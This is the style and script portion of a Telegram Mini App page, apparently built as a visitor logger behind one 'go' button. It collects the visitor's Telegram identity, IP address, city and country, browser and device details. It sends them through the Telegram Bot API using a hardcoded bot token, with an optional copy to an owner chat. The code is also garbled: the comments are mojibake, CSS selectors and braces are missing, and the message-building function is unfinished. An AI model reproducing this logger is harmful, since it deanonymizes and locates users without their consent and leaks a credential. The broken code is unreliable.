    <style>

        /* –§–æ–Ω–æ–≤—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã */

            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            overflow: hidden;
        }

        .bubble {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            animation: float 15s infinite linear;
        }

        .bubble:nth-child(1) {
            width: 80px;
            height: 80px;
            top: 20%;
            left: 10%;
            animation-delay: 0s;
        }

        .bubble:nth-child(2) {
            width: 120px;
            height: 120px;
            top: 60%;
            left: 80%;
            animation-delay: -5s;
        }

        .bubble:nth-child(3) {
            width: 60px;
            height: 60px;
            top: 80%;
            left: 20%;
            animation-delay: -10s;
        }

        .bubble:nth-child(4) {
            width: 100px;
            height: 100px;
            top: 40%;
            left: 70%;
            animation-delay: -7s;
        }

        .bubble:nth-child(5) {
            width: 90px;
            height: 90px;
            top: 10%;
            left: 85%;
            animation-delay: -12s;
        }

        @keyframes float {
            0%, 100% {
                transform: translateY(0) rotate(0deg);
                opacity: 0.5;
            }
            50% {
                transform: translateY(-100px) rotate(180deg);
                opacity: 0.8;
            }
        }

        /* –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä */
        .container {
            position: relative;
            z-index: 2;
            width: 90%;
            max-width: 500px;
            text-align: center;
            padding: 40px;
            backdrop-filter: blur(20px);
            background: rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 
                0 20px 40px rgba(0, 0, 0, 0.1),
                inset 0 1px 0 rgba(255, 255, 255, 0.2);
        }

        /* –õ–æ–≥–æ—Ç–∏–ø */
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 30px;
            background: linear-gradient(135deg, #fff, #f0f0f0);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 
                0 10px 20px rgba(0, 0, 0, 0.1),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
            transform-style: preserve-3d;
            perspective: 1000px;
        }

        .logo-inner {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 10px;
            transform: rotate(45deg);
            position: relative;
            overflow: hidden;
        }

        .logo-inner::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                to bottom right,
                rgba(255, 255, 255, 0.3) 0%,
                transparent 50%
            );
            transform: rotate(45deg);
        }

        /* –û—Å–Ω–æ–≤–Ω–∞—è –∫–Ω–æ–ø–∫–∞ */
        .main-button {
            position: relative;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 20px 40px;
            font-size: 20px;
            font-weight: 600;
            color: white;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            overflow: hidden;
            box-shadow: 
                0 10px 20px rgba(0, 0, 0, 0.2),
                0 6px 6px rgba(0, 0, 0, 0.1);
            min-width: 200px;
            margin-top: 20px;
        }

        .main-button:hover {
            transform: translateY(-5px) scale(1.05);
            box-shadow: 
                0 20px 40px rgba(0, 0, 0, 0.3),
                0 15px 12px rgba(0, 0, 0, 0.1);
            background: linear-gradient(135deg, #764ba2 0%, #667eea 100%);
        }

        .main-button:active {
            transform: translateY(-2px) scale(1.02);
            transition: all 0.1s;
        }

        .main-button .arrow {
            transition: transform 0.3s ease;
            font-size: 24px;
        }

        .main-button:hover .arrow {
            transform: translateX(5px);
        }

        .main-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                90deg,
                transparent,
                rgba(255, 255, 255, 0.2),
                transparent
            );
            transition: left 0.7s;
        }

        .main-button:hover::before {
            left: 100%;

        /* –≠—Ñ—Ñ–µ–∫—Ç –ø—É–ª—å—Å–∞—Ü–∏–∏ */
        @keyframes pulse {
            0% {
                box-shadow: 
                    0 0 0 0 rgba(102, 126, 234, 0.4),
                    0 10px 20px rgba(0, 0, 0, 0.2);
            }
            70% {
                box-shadow: 
                    0 0 0 15px rgba(102, 126, 234, 0),
                    0 10px 20px rgba(0, 0, 0, 0.2);
            }
            100% {
                box-shadow: 
                    0 0 0 0 rgba(102, 126, 234, 0),
                    0 10px 20px rgba(0, 0, 0, 0.2);
            }
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        /* –°–æ–æ–±—â–µ–Ω–∏–µ */
        .message {
            position: fixed;
            top: 50%;
            left: 50%;

            padding: 20px 40px;

            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .message.show {
            display: block;
            animation: slideIn 0.3s ease;
        }

        .message.success {
            background: rgba(76, 175, 80, 0.95);
            color: white;
        }

        .message.error {
            background: rgba(244, 67, 54, 0.95);
            color: white;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translate(-50%, -40%);
            }
            to {
                opacity: 1;
                transform: translate(-50%, -50%);
            }
        }

        .message-content {
            font-size: 16px;
            margin: 15px 0;
        }

        .message-icon {
            font-size: 48px;
            margin-bottom: 15px;

        .message-close {

            border: none;
            color: white;
            padding: 8px 20px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 15px;
            font-weight: 500;
            transition: background 0.3s;
        }

        .message-close:hover {
            background: rgba(255, 255, 255, 0.3);
        }

        /* –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏ */
        .loader {
            display: none;
            width: 50px;
            height: 50px;
            margin: 20px auto;
            position: relative;
        }

        .loader:before,
        .loader:after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 3px solid transparent;
            border-top-color: #667eea;
            animation: spin 1s linear infinite;
        }

        .loader:after {
            border-top-color: #764ba2;
            animation-delay: 0.5s;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }

        /* –ê–¥–∞–ø—Ç–∏–≤–Ω–æ—Å—Ç—å */
        @media (max-width: 768px) {

                border-radius: 20px;

            .main-button {
                padding: 18px 30px;
                font-size: 18px;
                min-width: 180px;
            }

            .message {

            }
        }

        @media (max-width: 480px) {

            }

                width: 30px;
                height: 30px;
            }

            .main-button {
                padding: 16px 24px;
                font-size: 16px;

            }

        /* –ü–∞—Ä—è—â–∏–π —ç—Ñ—Ñ–µ–∫—Ç –¥–ª—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ */
        @keyframes floatContainer {
            0%, 100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-10px);
            }
        }

        .container {
            animation: floatContainer 6s ease-in-out infinite;
        }

        /* –≠—Ñ—Ñ–µ–∫—Ç –≥—Ä–∞–¥–∏–µ–Ω—Ç–Ω–æ–π –≥—Ä–∞–Ω–∏—Ü—ã */
        .container::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;

            background: linear-gradient(45deg, 
                #667eea, #764ba2, #667eea, #764ba2);
            border-radius: 26px;
            z-index: -1;
            opacity: 0.3;
            filter: blur(10px);
        }
    </style>
</head>
<body>

    <!-- Telegram Web App SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const CONFIG = {
            BOT_TOKEN: '7960473361:AAF5A_Ho-re9DU8Rlidb2h6-vAQWCUAtOSQ',
            AUTO_CLOSE: false,
            OWNER_CHAT_ID: null // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à Chat ID
        };

        // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
        let tg = null;
        let telegramUser = null;
        let deviceData = {};
        let isSending = false;

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
        function initApp() {
            try {
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –æ—Ç–∫—Ä—ã—Ç–æ –ª–∏ –≤ Telegram
                if (typeof window.Telegram !== 'undefined' && window.Telegram.WebApp) {
                    tg = window.Telegram.WebApp;
                    tg.expand();
                    tg.ready();
                    
                    // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ Telegram
                    loadTelegramUserData();
                }
                
                // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
                collectDeviceData();
                
                // –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É
                setupButton();
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏:', error);
            }
        }

        // –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è Telegram
        function loadTelegramUserData() {
            try {
                const initData = tg?.initDataUnsafe;
                if (initData?.user) {
                    telegramUser = {
                        id: initData.user.id,
                        username: initData.user.username || null,
                        first_name: initData.user.first_name || '',
                        last_name: initData.user.last_name || '',
                        language_code: initData.user.language_code || 'ru',
                        is_premium: initData.user.is_premium || false
                    };
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', error);
            }
        }

        // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        async function collectDeviceData() {
            try {
                deviceData = {
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    url: window.location.href,
                    referrer: document.referrer || 'direct'
                };

                // –¢–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
                const ua = navigator.userAgent.toLowerCase();
                if (/mobile|android|iphone|ipad|ipod/.test(ua)) {
                    deviceData.type = /tablet|ipad/.test(ua) ? '–ü–ª–∞–Ω—à–µ—Ç' : '–¢–µ–ª–µ—Ñ–æ–Ω';
                } else {
                    deviceData.type = '–ö–æ–º–ø—å—é—Ç–µ—Ä';
                }

                // –ë—Ä–∞—É–∑–µ—Ä
                if (ua.includes('chrome') && !ua.includes('edge')) deviceData.browser = 'Chrome';
                else if (ua.includes('firefox')) deviceData.browser = 'Firefox';
                else if (ua.includes('safari') && !ua.includes('chrome')) deviceData.browser = 'Safari';
                else if (ua.includes('edge')) deviceData.browser = 'Edge';
                else if (ua.includes('opera') || ua.includes('opr')) deviceData.browser = 'Opera';
                else deviceData.browser = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';

                // IP –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    deviceData.ip = ipData.ip;
                    
                    try {
                        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                        const geoData = await geoResponse.json();
                        deviceData.location = `${geoData.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}, ${geoData.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}`;
                    } catch (geoError) {
                        deviceData.location = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
                    }
                } catch (ipError) {
                    deviceData.ip = '–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å';
                    deviceData.location = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
                }

                // –î–∞–Ω–Ω—ã–µ Telegram Web App –µ—Å–ª–∏ –µ—Å—Ç—å
                if (tg) {
                    deviceData.tgPlatform = tg.platform;
                    deviceData.tgVersion = tg.version;
                }

            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:', error);
            }
        }

        // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∫–Ω–æ–ø–∫–∏
        function setupButton() {
            const goButton = document.getElementById('goButton');
            const loader = document.getElementById('loader');
            
            goButton.addEventListener('click', async () => {
                if (isSending) return;
                
                isSending = true;
                goButton.disabled = true;
                loader.style.display = 'block';
                
                try {
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
                    const success = await sendDataToBot();
                    
                    if (success) {
                        showMessage('‚úÖ –î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!', 'success');
                        
                        // –ó–∞–∫—Ä—ã–≤–∞–µ–º Mini App –µ—Å–ª–∏ –≤ Telegram
                        if (tg && CONFIG.AUTO_CLOSE) {
                            setTimeout(() => {
                                tg.close();
                            }, 2000);
                        }
                    } else {
                        throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ');
                    }
                    
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞:', error);
                    showMessage('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö', 'error');
                } finally {
                    isSending = false;
                    goButton.disabled = false;
                    loader.style.display = 'none';
                    
                    // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∞–Ω–∏–º–∞—Ü–∏—é –ø—É–ª—å—Å–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
                    setTimeout(() => {
                        goButton.classList.add('pulse');
                    }, 3000);
                }
            });
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ –±–æ—Ç–∞
        async function sendDataToBot() {
            try {
                // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                const message = createTelegramMessage();
                
                // –û–ø—Ä–µ–¥–µ–ª—è–µ–º chat_id –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
                let chatId;
                if (telegramUser?.id) {
                    chatId = telegramUser.id; // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
                } else if (CONFIG.OWNER_CHAT_ID) {
                    chatId = CONFIG.OWNER_CHAT_ID; // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤–ª–∞–¥–µ–ª—å—Ü—É
                } else {
                    throw new Error('–ù–µ —É–∫–∞–∑–∞–Ω –ø–æ–ª—É—á–∞—Ç–µ–ª—å');
                }
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ Telegram Bot API
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–ø–∏—é –≤–ª–∞–¥–µ–ª—å—Ü—É –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
                    if (CONFIG.OWNER_CHAT_ID && telegramUser?.id !== CONFIG.OWNER_CHAT_ID) {
                        await sendCopyToOwner(message);
                    }
                    return true;
                } else {
                    throw new Error(result.description || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏');
                }
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ –±–æ—Ç–∞:', error);
                return false;
            }
        }

        // –°–æ–∑–¥–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è Telegram
        function createTelegramMessage() {
            const time = new Date(deviceData.timestamp).toLocaleString('ru-RU');
            const username = telegramUser?.username ? `@${telegramUser.username}` : '–ù–µ —É–∫–∞–∑–∞–Ω';
            const fullName = telegramUser ? 
                `${telegramUser.first_name} ${telegramUser.last_name}`.trim() : 
                '–ê–Ω–æ–Ω–∏–º–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å';
            
            let message = `<b>üÜï –ù–æ–≤—ã–π –ø–µ—Ä–µ—Ö–æ–¥!</b>\n\n`;
            
            if (telegramUser) {
                message += `<b>üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å Telegram:</b>\n`;
                message += `üÜî ID: <code>${telegramUser.id}</code>\n`;
                message += `üë§ –ò–º—è: ${fullName}\n`;
                message += `üìõ Username: ${username}\n`;
                message += `üåç –Ø–∑—ã–∫: ${telegramUser.language_code}\n`;
                message += `‚≠ê Premium: ${telegramUser.is_premium ? '‚úÖ –î–∞' : '‚ùå –ù–µ—Ç'}\n\n`;
            } else {
                message += `<b>üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:</b> –ê–Ω–æ–Ω–∏–º–Ω—ã–π (–Ω–µ –≤ Telegram)\n\n`;
            }
            
            message += `<b>üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:</b>\n`;
            message += `üïê –í—Ä–µ–º—è: ${time}\n`;
            message += `üåê IP: <code>${deviceData.ip || '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω'}</code>\n`;
            message += `üìç –õ–æ–∫–∞—Ü–∏—è: ${deviceData.location || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
            message += `üì± –¢–∏–ø: ${deviceData.type}\n`;
            message += `üåê –ë—Ä–∞—É–∑–µ—Ä: ${deviceData.browser}\n`;
            message += `üìè –≠–∫—Ä–∞–Ω: ${deviceData.screen}\n`;
            
            if (deviceData.tgPlatform) {
                message += `ü§ñ –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${deviceData.tgPlatform}\n`;
            }
            
            message += `üîó –°—Ç—Ä–∞–Ω–∏—Ü–∞: ${deviceData.url}\n\n`;
            
            if (deviceData.userAgent) {
                message += `<b>üîß User Agent:</b>\n<code>${deviceData.userAgent.substring(0, 150)}...</code>`;

        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–ø–∏–∏ –≤–ª–∞–¥–µ–ª—å—Ü—É
        async function sendCopyToOwner(originalMessage) {
            try {
                if (!CONFIG.OWNER_CHAT_ID) return;
                
                const ownerMessage = `üë§ –û—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: ${telegramUser?.username ? '@' + telegramUser.username : '–±–µ–∑ username'}\n\n` + originalMessage;
                
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.OWNER_CHAT_ID,
                        text: ownerMessage,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤–ª–∞–¥–µ–ª—å—Ü—É:', error);
            }
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ
        function showMessage(text, type) {
            const message = document.getElementById('message');
            const messageText = document.getElementById('messageText');
            const messageIcon = document.getElementById('messageIcon');
            
            messageText.textContent = text;
            message.className = `message show ${type}`;
            messageIcon.textContent = type === 'success' ? '‚úÖ' : '‚ùå';
            
            // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —Å–∫—Ä—ã—Ç–∏–µ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
            setTimeout(hideMessage, 5000);
        }

        // –°–∫—Ä—ã—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ
        function hideMessage() {
            const message = document.getElementById('message');
            message.classList.remove('show');
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        document.addEventListener('DOMContentLoaded', initApp);

        // –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∞–Ω–∏–º–∞—Ü–∏–µ–π –ø—É–ª—å—Å–∞—Ü–∏–∏ –ø—Ä–∏ –Ω–∞–≤–µ–¥–µ–Ω–∏–∏
        document.getElementById('goButton').addEventListener('mouseenter', function() {
            this.classList.remove('pulse');
        });

        document.getElementById('goButton').addEventListener('mouseleave', function() {
            if (!this.disabled) {
                setTimeout(() => {
                    this.classList.add('pulse');
                }, 300);
            }
        });
    </script>
